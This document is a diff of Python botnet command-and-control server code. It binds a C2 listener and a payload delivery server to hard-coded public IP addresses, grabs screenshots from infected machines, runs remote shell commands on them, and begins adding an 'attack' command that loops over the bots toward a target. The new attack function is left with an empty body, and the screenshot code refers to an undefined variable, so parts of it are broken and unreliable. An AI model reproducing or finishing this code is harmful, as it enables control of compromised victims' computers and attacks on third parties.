@@ -48,7 +48,7 @@ def start_payload_delivery_server(port=2004,ip="142.93.158.189"):
         except Exception as ee:
             print("[*] An Unknown Error Occurred : %s"%(str(ee)))
 
-def start_server(port=2003,ip="142.93.158.189"):
+def start_server(port=2003,ip="157.230.227.120"):
     global botnet,exec_command,on_connect_exit
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
@@ -86,6 +86,7 @@ def test_bots():
         global test_bool
         if(test_bool == False):
             print("[*] %s : Dead"%(bot))
+            del botnet[bot]
 
 def detect_os():
     global botnet
@@ -154,8 +155,8 @@ def get_screenshot(addr):
             pass
     except:
         pass
-    size = botnet[addr].recv(1024).decode()
-    image = botnet[addr].recv(int(size))
+    #size = botnet[addr].recv(1024).decode()
+    image = botnet[addr].recv(1024)
     image = b64.b64decode(data)
     check_container(addr)
     #os.chdir(addr)
@@ -247,6 +248,11 @@ def process_shell(cmd):
         elif(resp == "FAILED"):
             print("[*] Shell execution failed on %s"%(bot))
 
+def attack_server(ip):
+    global botnet
+    for bot in botnet:
+
+
 def process_cmd(cmd):
         global botnet
         sleep(1)
@@ -294,6 +300,9 @@ def process_cmd(cmd):
                 t1 = Thread(target=test_bots,args=())
                 t1.start()
                 pass
+
+            if "attack" in cmd:
+                attack_server(cmd.strip("attack "))
             # if(cmd == ""):
             #     pass
             else:
